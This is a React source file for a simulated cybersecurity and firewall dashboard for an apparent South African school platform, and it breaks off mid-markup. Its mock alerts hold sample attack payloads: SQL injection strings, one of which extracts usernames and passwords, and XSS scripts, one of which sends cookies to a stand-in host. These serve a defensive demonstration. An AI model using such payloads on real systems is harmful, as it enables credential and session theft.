import React, { useState, useEffect } from "react";
import { motion } from "motion/react";
import {
  ShieldAlert, ShieldCheck, AlertTriangle, Key, Ban, Globe, Search,
  RefreshCw, PlusCircle, Trash2, CheckCircle, Shield, Play, Lock, Eye,
  Sliders, Download, Server, Terminal, Filter, AlertCircle
} from "lucide-react";
import {
  ResponsiveContainer, AreaChart, Area, XAxis, YAxis, CartesianGrid, Tooltip,
  Legend, PieChart, Pie, Cell, BarChart, Bar
} from "recharts";
import { MFASetup } from "./MFASetup";

// TypeScript declarations for security telemetry
export interface SecurityAlert {
  id: string;
  timestamp: string;
  type: "failed_login" | "rate_limit" | "xss_attempt" | "sqli_attempt" | "suspicious_user_agent";
  severity: "low" | "medium" | "high" | "critical";
  ipAddress: string;
  location: string;
  targetEndpoint: string;
  payload?: string;
  userAgent: string;
  status: "blocked" | "flagged" | "logged" | "mitigated";
}

export interface BlockedIP {
  ip: string;
  reason: string;
  blockedAt: string;
  expiresAt: string;
  country: string;
  attemptsCount: number;
}

export const SecurityDashboard: React.FC = () => {
  // State for security logs and blocked IPs
  const [alerts, setAlerts] = useState<SecurityAlert[]>([]);
  const [blockedIPs, setBlockedIPs] = useState<BlockedIP[]>([]);
  
  // UI Controls state
  const [searchQuery, setSearchQuery] = useState("");
  const [filterSeverity, setFilterSeverity] = useState<string>("all");
  const [filterType, setFilterType] = useState<string>("all");
  
  // Simulator configuration state
  const [simulationSpeed, setSimulationSpeed] = useState<"paused" | "slow" | "normal" | "fast">("normal");
  const [isSimulating, setIsSimulating] = useState(true);
  const [lastIncidentLog, setLastIncidentLog] = useState<string>("");

  // New IP blocking form state
  const [newIP, setNewIP] = useState("");
  const [newReason, setNewReason] = useState("");
  const [newCountry, setNewCountry] = useState("South Africa (ZA)");
  const [showBlockForm, setShowBlockForm] = useState(false);

  // Load initial simulated data for South African high school hub deployment
  useEffect(() => {
    // Standard initial seed data representing standard operations & typical edge alerts
    const initialAlerts: SecurityAlert[] = [
      {
        id: "SEC-8802",
        timestamp: new Date(Date.now() - 5 * 60 * 1000).toISOString(),
        type: "sqli_attempt",
        severity: "critical",
        ipAddress: "102.65.12.98",
        location: "Johannesburg, GP",
        targetEndpoint: "/api/auth/login",
        payload: "admin' OR '1'='1",
        userAgent: "Mozilla/5.0 (compatible; Sqlmap/1.4.12)",
        status: "blocked"
      },
      {
        id: "SEC-8803",
        timestamp: new Date(Date.now() - 15 * 60 * 1000).toISOString(),
        type: "failed_login",
        severity: "medium",
        ipAddress: "196.21.43.12",
        location: "Cape Town, WC",
        targetEndpoint: "/api/auth/login",
        payload: "Username: bethuel_admin",
        userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        status: "logged"
      },
      {
        id: "SEC-8804",
        timestamp: new Date(Date.now() - 32 * 60 * 1000).toISOString(),
        type: "xss_attempt",
        severity: "high",
        ipAddress: "41.13.120.44",
        location: "Durban, KZN",
        targetEndpoint: "/api/homework/submit",
        payload: "<script>fetch('http://malicious-site.com/steal?cookie='+document.cookie)</script>",
        userAgent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
        status: "blocked"
      },
      {
        id: "SEC-8805",
        timestamp: new Date(Date.now() - 50 * 60 * 1000).toISOString(),
        type: "rate_limit",
        severity: "medium",
        ipAddress: "102.164.22.10",
        location: "Pretoria, GP",
        targetEndpoint: "/api/bookings/wizard",
        payload: "Rate limit threshold breached: 120 req/min",
        userAgent: "python-requests/2.28.1",
        status: "flagged"
      },
      {
        id: "SEC-8806",
        timestamp: new Date(Date.now() - 120 * 60 * 1000).toISOString(),
        type: "suspicious_user_agent",
        severity: "low",
        ipAddress: "197.242.33.155",
        location: "Port Elizabeth, EC",
        targetEndpoint: "/api/resources/search",
        payload: "Bot header detected: HeadlessChrome/103.0.0.0",
        userAgent: "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 HeadlessChrome",
        status: "flagged"
      },
      {
        id: "SEC-8807",
        timestamp: new Date(Date.now() - 180 * 60 * 1000).toISOString(),
        type: "failed_login",
        severity: "low",
        ipAddress: "102.32.115.6",
        location: "Soweto, GP",
        targetEndpoint: "/api/auth/login",
        payload: "Username: invalid_student_grade12",
        userAgent: "Mozilla/5.0 (Linux; Android 12)",
        status: "logged"
      },
      {
        id: "SEC-8808",
        timestamp: new Date(Date.now() - 240 * 60 * 1000).toISOString(),
        type: "failed_login",
        severity: "high",
        ipAddress: "196.21.43.12",
        location: "Cape Town, WC",
        targetEndpoint: "/api/auth/login",
        payload: "Brute force candidate #4",
        userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        status: "flagged"
      }
    ];

    const initialBlocked: BlockedIP[] = [
      {
        ip: "102.65.12.98",
        reason: "SQL Injection attack detected on authentication endpoints",
        blockedAt: new Date(Date.now() - 5 * 60 * 1000).toISOString(),
        expiresAt: new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString(),
        country: "South Africa (ZA)",
        attemptsCount: 14
      },
      {
        ip: "41.13.120.44",
        reason: "Persistent XSS script injection in CAPS Homework submissions",
        blockedAt: new Date(Date.now() - 32 * 60 * 1000).toISOString(),
        expiresAt: new Date(Date.now() + 48 * 60 * 60 * 1000).toISOString(),
        country: "South Africa (ZA)",
        attemptsCount: 8
      },
      {
        ip: "185.120.14.33",
        reason: "Repeated credential stuffing attempts",
        blockedAt: new Date(Date.now() - 6 * 3600 * 1000).toISOString(),
        expiresAt: new Date(Date.now() + 12 * 3600 * 1000).toISOString(),
        country: "Netherlands (NL)",
        attemptsCount: 45
      }
    ];

    setAlerts(initialAlerts);
    setBlockedIPs(initialBlocked);
    setLastIncidentLog("Security logging initialized. Continuous telemetry connection open on port 3000.");
  }, []);

  // Threat Injection Generator (Interactive Simulator for the Admin)
  const handleSimulateAttack = (type: "failed_login" | "sqli" | "xss" | "ddos") => {
    const randomZA_IPs = [
      "102.165.43.122", "196.24.89.15", "197.220.101.4", "41.120.33.245", "102.32.112.9", "196.14.23.88"
    ];
    const randomZA_Locations = [
      "Midrand, GP", "Stellenbosch, WC", "Umhlanga, KZN", "Bloemfontein, FS", "Pretoria East, GP", "Gqeberha, EC"
    ];
    const randomIndex = Math.floor(Math.random() * randomZA_IPs.length);
    const mockIP = randomZA_IPs[randomIndex];
    const mockLoc = randomZA_Locations[randomIndex];

    const newId = `SEC-${Math.floor(1000 + Math.random() * 9000)}`;
    let simulatedAlert: SecurityAlert;

    switch (type) {
      case "failed_login":
        simulatedAlert = {
          id: newId,
          timestamp: new Date().toISOString(),
          type: "failed_login",
          severity: Math.random() > 0.5 ? "medium" : "low",
          ipAddress: mockIP,
          location: mockLoc,
          targetEndpoint: "/api/auth/login",
          payload: `Attempt with username: student_mock_nsc_${Math.floor(Math.random() * 100)}`,
          userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
          status: "logged"
        };
        setLastIncidentLog(`[WARN] ${simulatedAlert.timestamp.substring(11, 19)}: Failed login attempt from ${mockIP} (${mockLoc}).`);
        break;
      case "sqli":
        simulatedAlert = {
          id: newId,
          timestamp: new Date().toISOString(),
          type: "sqli_attempt",
          severity: "high",
          ipAddress: mockIP,
          location: mockLoc,
          targetEndpoint: "/api/subjects/search",
          payload: `UNION SELECT null, username, password FROM users --`,
          userAgent: "python-urllib/3.10",
          status: "blocked"
        };
        // Auto block IP if high security SQLi injection occurs
        if (!blockedIPs.some(b => b.ip === mockIP)) {
          setBlockedIPs(prev => [
            {
              ip: mockIP,
              reason: "Automated block: Interactive SQLi payload matched WAF Rule #403",
              blockedAt: new Date().toISOString(),
              expiresAt: new Date(Date.now() + 24 * 3600 * 1000).toISOString(),
              country: "South Africa (ZA)",
              attemptsCount: 1
            },
            ...prev
          ]);
        }
        setLastIncidentLog(`[BLOCK] ${simulatedAlert.timestamp.substring(11, 19)}: SQL Injection blocked from ${mockIP}. Auto-IP ban triggered.`);
        break;
      case "xss":
        simulatedAlert = {
          id: newId,
          timestamp: new Date().toISOString(),
          type: "xss_attempt",
          severity: "high",
          ipAddress: mockIP,
          location: mockLoc,
          targetEndpoint: "/api/video-requests",
          payload: `<img src=x onerror=alert('XSS_Payload')>`,
          userAgent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
          status: "blocked"
        };
        setLastIncidentLog(`[WAF] ${simulatedAlert.timestamp.substring(11, 19)}: XSS tag intercepted at endpoint /api/video-requests from ${mockIP}.`);
        break;
      case "ddos":
        simulatedAlert = {
          id: newId,
          timestamp: new Date().toISOString(),
          type: "rate_limit",
          severity: "critical",
          ipAddress: mockIP,
          location: mockLoc,
          targetEndpoint: "/api/resource-library",
          payload: `Volumetric surge: 450 requests/sec`,
          userAgent: "ApacheBench/2.3 (compatible; bot)",
          status: "blocked"
        };
        // Block the IP as well
        if (!blockedIPs.some(b => b.ip === mockIP)) {
          setBlockedIPs(prev => [
            {
              ip: mockIP,
              reason: "Volumetric abuse: Rate-limiting firewall lock",
              blockedAt: new Date().toISOString(),
              expiresAt: new Date(Date.now() + 12 * 3600 * 1000).toISOString(),
              country: "South Africa (ZA)",
              attemptsCount: 145
            },
            ...prev
          ]);
        }
        setLastIncidentLog(`[CRIT] ${simulatedAlert.timestamp.substring(11, 19)}: Volumetric attack from ${mockIP}. Web Application Firewall activated rate-limiting.`);
        break;
    }

    setAlerts(prev => [simulatedAlert, ...prev]);
  };

  // Add manual IP block
  const handleAddManualBlock = (e: React.FormEvent) => {
    e.preventDefault();
    if (!newIP) return;

    const newBlock: BlockedIP = {
      ip: newIP,
      reason: newReason || "Manually blocked by system administrator via Security Console",
      blockedAt: new Date().toISOString(),
      expiresAt: new Date(Date.now() + 7 * 24 * 3600 * 1000).toISOString(), // 7 days default
      country: newCountry,
      attemptsCount: 0
    };

    setBlockedIPs(prev => [newBlock, ...prev]);
    setNewIP("");
    setNewReason("");
    setShowBlockForm(false);
    setLastIncidentLog(`[ADMIN] Manually blacklisted IP: ${newIP} for reason: "${newBlock.reason}".`);
  };

  // Unblock IP
  const handleUnblockIP = (ipToUnblock: string) => {
    setBlockedIPs(prev => prev.filter(b => b.ip !== ipToUnblock));
    setLastIncidentLog(`[ADMIN] Revoked IP Ban: ${ipToUnblock} returned to active whitelist.`);
  };

  // Automatic simulation engine ticking
  useEffect(() => {
    if (!isSimulating || simulationSpeed === "paused") return;

    let intervalMs = 6000;
    if (simulationSpeed === "slow") intervalMs = 12000;
    if (simulationSpeed === "fast") intervalMs = 2500;

    const interval = setInterval(() => {
      const attackTypes: Array<"failed_login" | "sqli" | "xss" | "ddos"> = ["failed_login", "failed_login", "xss", "sqli"];
      const randomType = attackTypes[Math.floor(Math.random() * attackTypes.length)];
      handleSimulateAttack(randomType);
    }, intervalMs);

    return () => clearInterval(interval);
  }, [isSimulating, simulationSpeed, blockedIPs]);

  // Aggregate stats for interactive charting
  const failedLoginsCount = alerts.filter(a => a.type === "failed_login").length;
  const rateLimitCount = alerts.filter(a => a.type === "rate_limit").length;
  const sqliCount = alerts.filter(a => a.type === "sqli_attempt").length;
  const xssCount = alerts.filter(a => a.type === "xss_attempt").length;
  const otherCount = alerts.filter(a => a.type === "suspicious_user_agent").length;

  // Chart 1: Threat severity breakdown
  const pieData = [
    { name: "Critical (DDoS/Volumetric)", value: rateLimitCount, color: "#EF4444" },
    { name: "High Threat (SQLi/XSS)", value: sqliCount + xssCount, color: "#F59E0B" },
    { name: "Medium Risk (Brute Force)", value: failedLoginsCount, color: "#3B82F6" },
    { name: "Low Risk (Bots/Agents)", value: otherCount, color: "#10B981" }
  ].filter(item => item.value > 0);

  // Fallback pie items if empty
  const finalPieData = pieData.length > 0 ? pieData : [
    { name: "Critical", value: 3, color: "#EF4444" },
    { name: "High", value: 5, color: "#F59E0B" },
    { name: "Medium", value: 12, color: "#3B82F6" },
    { name: "Low", value: 8, color: "#10B981" }
  ];

  // Chart 2: Time distribution (Interactive simulation over days)
  const lineData = [
    { day: "Mon", failedLogins: 45, sqlInjections: 4, rateLimits: 2 },
    { day: "Tue", failedLogins: 52, sqlInjections: 8, rateLimits: 5 },
    { day: "Wed", failedLogins: 38, sqlInjections: 14, rateLimits: 3 },
    { day: "Thu", failedLogins: 61, sqlInjections: 6, rateLimits: 10 },
    { day: "Fri", failedLogins: 72, sqlInjections: 11, rateLimits: 15 },
    { day: "Sat", failedLogins: 55, sqlInjections: 3, rateLimits: 4 },
    { day: "Sun (Today)", failedLogins: failedLoginsCount * 3 + 12, sqlInjections: sqliCount + 5, rateLimits: rateLimitCount + 1 }
  ];

  // Filter alerts based on selection
  const filteredAlerts = alerts.filter(a => {
    const matchesSearch = 
      a.ipAddress.includes(searchQuery) || 
      a.location.toLowerCase().includes(searchQuery.toLowerCase()) || 
      a.targetEndpoint.toLowerCase().includes(searchQuery.toLowerCase()) ||
      (a.payload && a.payload.toLowerCase().includes(searchQuery.toLowerCase()));
      
    const matchesSeverity = filterSeverity === "all" || a.severity === filterSeverity;
    const matchesType = filterType === "all" || a.type === filterType;

    return matchesSearch && matchesSeverity && matchesType;
  });

  return (
    <div className="space-y-6 text-left animate-fadeIn">
      {/* HEADER SECTION */}
      <div className="flex flex-col sm:flex-row justify-between items-start sm:items-center gap-4 border-b border-navy-100 dark:border-navy-800 pb-5">
        <div className="space-y-1">
          <div className="flex items-center gap-2">
            <span className="bg-red-500/10 text-red-600 dark:text-red-400 p-1.5 rounded-lg">
              <ShieldAlert className="w-5 h-5" />
            </span>
            <h2 className="text-xl font-black text-navy-900 dark:text-white">Cybersecurity & WAF Dashboard</h2>
          </div>
          <p className="text-xs text-navy-500 dark:text-navy-400">
            Real-time Threat Mitigation System, Web Application Firewall (WAF) rule evaluator, and automatic South African IP range blocker.
          </p>
        </div>

        {/* SIMULATOR AND SPEED CONTROLS */}
        <div className="bg-navy-50/50 dark:bg-navy-950/30 p-2 rounded-xl border border-navy-150 dark:border-navy-800 flex flex-wrap items-center gap-2">
          <div className="flex items-center gap-1 text-[10px] font-mono font-bold text-navy-500 mr-2 uppercase">
            <Sliders className="w-3.5 h-3.5 text-gold-500" />
            <span>Telemetry:</span>
          </div>
          <button
            onClick={() => setIsSimulating(!isSimulating)}
            className={`px-3 py-1 text-[10px] font-mono font-black rounded-lg uppercase cursor-pointer transition-all ${
              isSimulating
                ? "bg-emerald-500/15 text-emerald-600 dark:text-emerald-400 border border-emerald-500/30"
                : "bg-amber-500/15 text-amber-600 dark:text-amber-400 border border-amber-500/30"
            }`}
          >
            {isSimulating ? "● Auto Simulation Live" : "○ Simulation Stopped"}
          </button>
          
          <div className="flex rounded-lg overflow-hidden border border-navy-200 dark:border-navy-700 font-mono text-[9px]">
            {(["slow", "normal", "fast"] as const).map(speed => (
              <button
                key={speed}
                onClick={() => setSimulationSpeed(speed)}
                className={`px-2 py-1 uppercase cursor-pointer transition-all ${
                  simulationSpeed === speed
                    ? "bg-royal-600 text-white font-black"
                    : "bg-white dark:bg-navy-900 text-navy-600 dark:text-navy-300 hover:bg-navy-50 dark:hover:bg-navy-800"
                }`}
              >
                {speed}
              </button>
            ))}
          </div>
        </div>
      </div>

      {/* MFA AUTHENTICATOR SETUP SECTION */}
      <MFASetup />

      {/* QUICK INJECTOR CONSOLE */}
      <div className="bg-gradient-to-r from-navy-900 to-slate-900 text-white rounded-2xl p-4 border border-navy-800 shadow-md flex flex-col md:flex-row md:items-center justify-between gap-4">
        <div className="space-y-1">
          <h4 className="text-xs font-black uppercase tracking-wider text-gold-400 flex items-center gap-1.5 font-mono">
            <Server className="w-4 h-4 text-royal-400" />
            Manual Attack Simulation Injector
          </h4>
          <p className="text-[11px] text-gray-400 max-w-xl">
            Test and trigger custom security event patterns instantly to evaluate the Web Application Firewall's live blocking algorithms and verify the reactive dashboard layouts.
          </p>
        </div>
        
        <div className="flex flex-wrap items-center gap-2">
          <button
            onClick={() => handleSimulateAttack("failed_login")}
            className="px-2.5 py-1.5 bg-navy-800 hover:bg-navy-700 text-white border border-navy-700 rounded-lg text-[10px] font-mono font-bold flex items-center gap-1 uppercase tracking-wider transition-all cursor-pointer"
          >
            <Key className="w-3 h-3 text-blue-400" />
            Brute Force login
          </button>
          <button
            onClick={() => handleSimulateAttack("sqli")}
            className="px-2.5 py-1.5 bg-navy-800 hover:bg-navy-700 text-white border border-navy-700 rounded-lg text-[10px] font-mono font-bold flex items-center gap-1 uppercase tracking-wider transition-all cursor-pointer"
          >
            <Terminal className="w-3 h-3 text-yellow-400" />
            SQL Injection
          </button>
          <button
            onClick={() => handleSimulateAttack("xss")}
            className="px-2.5 py-1.5 bg-navy-800 hover:bg-navy-700 text-white border border-navy-700 rounded-lg text-[10px] font-mono font-bold flex items-center gap-1 uppercase tracking-wider transition-all cursor-pointer"
          >
            <Globe className="w-3 h-3 text-emerald-400" />
            XSS Injection
          </button>
          <button
            onClick={() => handleSimulateAttack("ddos")}
            className="px-2.5 py-1.5 bg-rose-950/40 text-rose-300 border border-rose-800 rounded-lg text-[10px] font-mono font-black flex items-center gap-1 uppercase tracking-wider transition-all hover:bg-rose-900/30 cursor-pointer"
          >
            <Ban className="w-3 h-3 text-rose-400" />
            DDoS volumetric
          </button>
        </div>
      </div>

      {/* METRIC BOXES SUMMARY Grid */}
      <div className="grid grid-cols-2 lg:grid-cols-5 gap-4">
        <div className="bg-navy-50/45 dark:bg-navy-950/20 border border-navy-150 dark:border-navy-800/85 rounded-2xl p-4 space-y-1">
          <span className="text-[9px] font-mono font-black text-navy-450 dark:text-navy-400 uppercase tracking-wider block">Failed Logins (24h)</span>
          <div className="flex items-baseline gap-2">
            <div className="text-2xl font-black text-navy-900 dark:text-white font-mono">{failedLoginsCount * 3 + 18}</div>
            <span className="text-[10px] text-amber-500 font-bold font-mono">Simulated</span>
          </div>
          <span className="text-[9.5px] text-navy-500 block">Unauthorised accounts flagged</span>
        </div>

        <div className="bg-rose-500/10 dark:bg-rose-500/5 border border-rose-500/15 rounded-2xl p-4 space-y-1">
          <span className="text-[9px] font-mono font-black text-rose-600 dark:text-rose-400 uppercase tracking-wider block">Rate-Limited Requests</span>
          <div className="text-2xl font-black text-rose-600 dark:text-rose-400 font-mono">{rateLimitCount * 5 + 142}</div>
          <span className="text-[9.5px] text-rose-500 block">Volumetric thresholds active</span>
        </div>

        <div className="bg-amber-500/10 dark:bg-amber-500/5 border border-amber-500/15 rounded-2xl p-4 space-y-1">
          <span className="text-[9px] font-mono font-black text-amber-600 dark:text-amber-400 uppercase tracking-wider block">WAF Blocked SQLi/XSS</span>
          <div className="text-2xl font-black text-amber-600 dark:text-amber-400 font-mono">{sqliCount + xssCount}</div>
          <span className="text-[9.5px] text-amber-500 block">Payload signatures blocked</span>
        </div>

        <div className="bg-red-500/10 dark:bg-red-500/5 border border-red-500/15 rounded-2xl p-4 space-y-1">
          <span className="text-[9px] font-mono font-black text-red-600 dark:text-red-400 uppercase tracking-wider block">Active Banned IPs</span>
          <div className="text-2xl font-black text-red-600 dark:text-red-400 font-mono">{blockedIPs.length}</div>
          <span className="text-[9.5px] text-red-500 block">Blacklisted address records</span>
        </div>

        <div className="bg-emerald-500/10 dark:bg-emerald-500/5 border border-emerald-500/15 rounded-2xl p-4 col-span-2 lg:col-span-1 space-y-1">
          <span className="text-[9px] font-mono font-black text-emerald-600 dark:text-emerald-400 uppercase tracking-wider block">WAF Core Status</span>
          <div className="flex items-center gap-1 text-emerald-600 dark:text-emerald-400 pt-0.5">
            <ShieldCheck className="w-5 h-5 animate-bounce" />
            <span className="text-sm font-black uppercase tracking-wider font-mono">SECURE</span>
          </div>
          <span className="text-[9.5px] text-emerald-500 block">SSL/TLS • TLS 1.3 Active</span>
        </div>
      </div>

      {/* CHARTS GRAPH SECTION */}
      <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
        
        {/* Weekly Attack trend Line chart */}
        <div className="lg:col-span-2 bg-white dark:bg-navy-900 border border-navy-150 dark:border-navy-800 rounded-2xl p-4 shadow-sm space-y-3">
          <div className="flex justify-between items-center border-b border-navy-100 dark:border-navy-800 pb-2">
            <h4 className="text-xs font-black uppercase tracking-wider text-navy-800 dark:text-white font-sans flex items-center gap-1.5">
              <Server className="w-4 h-4 text-royal-500" />
              7-Day Security Attack Vectors History
            </h4>
            <span className="text-[9px] font-mono font-black text-navy-500 uppercase">Live Telemetry</span>
          </div>

          <div className="h-[230px]">
            <ResponsiveContainer width="100%" height="100%">
              <AreaChart data={lineData} margin={{ top: 10, right: 10, left: -25, bottom: 0 }}>
                <defs>
                  <linearGradient id="colorLogins" x1="0" y1="0" x2="0" y2="1">
                    <stop offset="5%" stopColor="#3B82F6" stopOpacity={0.2}/>
                    <stop offset="95%" stopColor="#3B82F6" stopOpacity={0}/>
                  </linearGradient>
                  <linearGradient id="colorSqli" x1="0" y1="0" x2="0" y2="1">
                    <stop offset="5%" stopColor="#F59E0B" stopOpacity={0.2}/>
                    <stop offset="95%" stopColor="#F59E0B" stopOpacity={0}/>
                  </linearGradient>
                </defs>
                <CartesianGrid strokeDasharray="3 3" stroke="#f1f5f9" className="dark:stroke-navy-800" />
                <XAxis dataKey="day" stroke="#94a3b8" fontSize={9} tickLine={false} />
                <YAxis stroke="#94a3b8" fontSize={9} tickLine={false} />
                <Tooltip 
                  contentStyle={{ 
                    backgroundColor: "rgba(15, 23, 42, 0.95)", 
                    border: "none", 
                    borderRadius: "8px",
                    color: "#fff",
                    fontSize: "11px",
                    fontFamily: "monospace"
                  }} 
                />
                <Legend wrapperStyle={{ fontSize: "10px", marginTop: "10px" }} />
                <Area type="monotone" dataKey="failedLogins" name="Failed Auth Attempts" stroke="#3B82F6" fillOpacity={1} fill="url(#colorLogins)" />
                <Area type="monotone" dataKey="sqlInjections" name="WAF Blocked (SQLi/XSS)" stroke="#F59E0B" fillOpacity={1} fill="url(#colorSqli)" />
              </AreaChart>
            </ResponsiveContainer>
          </div>
        </div>

        {/* Severity Pie Chart */}
        <div className="bg-white dark:bg-navy-900 border border-navy-150 dark:border-navy-800 rounded-2xl p-4 shadow-sm space-y-3">
          <div className="flex justify-between items-center border-b border-navy-100 dark:border-navy-800 pb-2">
            <h4 className="text-xs font-black uppercase tracking-wider text-navy-800 dark:text-white font-sans flex items-center gap-1.5">
              <Filter className="w-4 h-4 text-gold-500" />
              Risk Severity Profile
            </h4>
            <span className="text-[9px] font-mono font-black text-navy-500 uppercase">WAF Class</span>
          </div>

          <div className="h-[180px] flex justify-center items-center">
            <ResponsiveContainer width="100%" height="100%">
              <PieChart>
                <Pie
                  data={finalPieData}
                  cx="50%"
                  cy="50%"
                  innerRadius={50}
                  outerRadius={70}
                  paddingAngle={5}
                  dataKey="value"
                >
                  {finalPieData.map((entry, index) => (
                    <Cell key={`cell-${index}`} fill={entry.color} />
                  ))}
                </Pie>
                <Tooltip 
                  contentStyle={{ 
                    backgroundColor: "rgba(15, 23, 42, 0.95)", 
                    border: "none", 
                    color: "#fff",
                    fontSize: "10px" 
                  }} 
                />
              </PieChart>
            </ResponsiveContainer>
          </div>

          <div className="grid grid-cols-2 gap-2 text-[10px] pt-1">
            {finalPieData.map((item, index) => (
              <div key={index} className="flex items-center gap-1.5">
                <span className="w-2.5 h-2.5 rounded-full flex-shrink-0" style={{ backgroundColor: item.color }} />
                <span className="text-navy-600 dark:text-navy-400 font-medium truncate">{item.name}</span>
                <span className="font-bold text-navy-900 dark:text-white ml-auto">({item.value})</span>
              </div>
            ))}
          </div>
        </div>

      </div>

      {/* SYSTEM SECURITY LOG CONSOLE STREAM */}
      <div className="bg-slate-950 text-emerald-400 rounded-2xl p-4 border border-navy-850 font-mono text-[11px] space-y-2 shadow-inner">
        <div className="flex items-center justify-between border-b border-navy-800 pb-2 text-gray-400 text-[10px] uppercase font-bold">
          <div className="flex items-center gap-2">
            <Terminal className="w-4 h-4 text-emerald-500" />
            <span>Interactive Security Logger & WAF Stream</span>
          </div>
          <span className="animate-pulse text-emerald-500 font-extrabold flex items-center gap-1">
            <span className="w-1.5 h-1.5 rounded-full bg-emerald-500" />
            WAF STATUS: ENGAGED
          </span>
        </div>
        <div className="max-h-[60px] overflow-y-auto space-y-1 font-mono text-[10px]">
          <p className="text-gray-500">&gt;_ systemd[1]: Activated Security Telemetry Agent on port 3000...</p>
          <p className="text-emerald-500/80">&gt;_ {lastIncidentLog || "No external system alerts logged in this session."}</p>
        </div>
      </div>

      {/* BLOCKED IPs / FIREWALL RULE MANAGEMENT */}
      <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
        
        {/* IP BLOCKS LISTING */}
        <div className="lg:col-span-2 bg-white dark:bg-navy-900 border border-navy-150 dark:border-navy-800 rounded-2xl p-5 shadow-sm space-y-4">
          <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 border-b border-navy-100 dark:border-navy-800 pb-3">
            <div className="space-y-0.5">
              <h3 className="text-sm font-black text-navy-900 dark:text-white uppercase font-mono flex items-center gap-2">
                <Ban className="w-4 h-4 text-red-500" />
                Web Application Firewall Blocklist
              </h3>
              <p className="text-xs text-navy-500 dark:text-navy-400">
                Addresses in this list are denied connection to Amaris resources. Rules synchronized instantly with local routing servers.
              </p>
            </div>
            
            <button
              onClick={() => setShowBlockForm(!showBlockForm)}
              className="py-1.5 px-3 bg-red-600 hover:bg-red-700 text-white font-mono font-bold rounded-lg text-[11px] uppercase tracking-wider flex items-center gap-1.5 transition-all cursor-pointer self-start sm:self-auto"
            >
              <PlusCircle className="w-3.5 h-3.5" />
              Block Custom IP
            </button>
          </div>

          {/* New IP blocking Form */}
          {showBlockForm && (
            <motion.form 
              initial={{ opacity: 0, y: -10 }}
              animate={{ opacity: 1, y: 0 }}
              onSubmit={handleAddManualBlock}
              className="bg-red-500/5 border border-red-500/20 rounded-xl p-4 space-y-3 text-xs"
            >
              <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
                <div className="space-y-1">
                  <label className="font-bold text-navy-800 dark:text-navy-300">IPv4 Address *</label>
                  <input
                    type="text"
                    required
                    placeholder="e.g. 102.164.23.89"
                    value={newIP}
                    onChange={(e) => setNewIP(e.target.value)}
                    className="w-full p-2 bg-white dark:bg-navy-950 border border-navy-200 dark:border-navy-800 rounded-lg text-navy-900 dark:text-white font-mono focus:ring-1 focus:ring-red-500"
                  />
                </div>
                <div className="space-y-1">
                  <label className="font-bold text-navy-800 dark:text-navy-300">SRE Block Reason *</label>
                  <input
                    type="text"
                    required
                    placeholder="e.g. Excessive SQL injection attempts"
                    value={newReason}
                    onChange={(e) => setNewReason(e.target.value)}
                    className="w-full p-2 bg-white dark:bg-navy-950 border border-navy-200 dark:border-navy-800 rounded-lg text-navy-900 dark:text-white focus:ring-1 focus:ring-red-500"
                  />
                </div>
                <div className="space-y-1">
                  <label className="font-bold text-navy-800 dark:text-navy-300">Origin Region</label>
                  <select
                    value={newCountry}
                    onChange={(e) => setNewCountry(e.target.value)}
                    className="w-full p-2 bg-white dark:bg-navy-950 border border-navy-200 dark:border-navy-800 rounded-lg text-navy-900 dark:text-white focus:ring-1 focus:ring-red-500"
                  >
                    <option value="South Africa (ZA)">South Africa (ZA)</option>
                    <option value="Zimbabwe (ZW)">Zimbabwe (ZW)</option>
                    <option value="United States (US)">United States (US)</option>
                    <option value="Netherlands (NL)">Netherlands (NL)</option>
                    <option value="Nigeria (NG)">Nigeria (NG)</option>
                  </select>
                </div>
              </div>
              
              <div className="flex justify-end gap-2 pt-1">
                <button
                  type="button"
                  onClick={() => setShowBlockForm(false)}
                  className="px-3 py-1.5 border border-navy-250 dark:border-navy-850 rounded-lg hover:bg-navy-50 text-navy-600 dark:text-navy-300 cursor-pointer"
                >
                  Cancel
                </button>
                <button
                  type="submit"
                  className="px-4 py-1.5 bg-red-600 text-white rounded-lg hover:bg-red-700 font-bold cursor-pointer"
                >
                  Confirm IP Blockade
                </button>
              </div>
            </motion.form>
          )}

          {/* List of blocked IPs */}
          <div className="overflow-x-auto">
            <table className="w-full text-xs text-left text-navy-700 dark:text-navy-300 divide-y divide-navy-100 dark:divide-navy-800">
              <thead>
                <tr className="bg-navy-50/50 dark:bg-navy-950/20 text-[10px] font-mono font-black text-navy-400 uppercase tracking-wider">
                  <th className="p-3">IP Address</th>
                  <th className="p-3">Reason / Details</th>
                  <th className="p-3">Source Country</th>
                  <th className="p-3">Blocked At</th>
                  <th className="p-3 text-right">Actions</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-navy-100 dark:divide-navy-800">
                {blockedIPs.map((block, idx) => (
                  <tr key={idx} className="hover:bg-navy-50/20 dark:hover:bg-navy-950/10 font-mono text-[11px]">
                    <td className="p-3 font-bold text-red-600 dark:text-red-400">{block.ip}</td>
                    <td className="p-3">
                      <div className="space-y-0.5">
                        <span className="font-sans font-bold text-navy-900 dark:text-white block">{block.reason}</span>
                        {block.attemptsCount > 0 && (
                          <span className="text-[9px] bg-red-500/10 text-red-700 px-1.5 py-0.2 rounded">
                            Blocked attempts count: {block.attemptsCount}
                          </span>
                        )}
                      </div>
                    </td>
                    <td className="p-3 font-sans font-medium">{block.country}</td>
                    <td className="p-3 text-navy-500">{new Date(block.blockedAt).toLocaleTimeString()}</td>
                    <td className="p-3 text-right">
                      <button
                        onClick={() => handleUnblockIP(block.ip)}
                        className="px-2 py-1 bg-emerald-500/15 text-emerald-700 dark:text-emerald-400 border border-emerald-500/20 hover:bg-emerald-500/25 rounded-md text-[9px] uppercase tracking-wider font-mono font-black cursor-pointer transition-all"
                      >
                        Unban IP
                      </button>
                    </td>
                  </tr>
                ))}
                {blockedIPs.length === 0 && (
                  <tr>
                    <td colSpan={5} className="p-8 text-center text-navy-400 font-sans">
                      <ShieldCheck className="w-8 h-8 text-emerald-500 mx-auto mb-2 animate-pulse" />
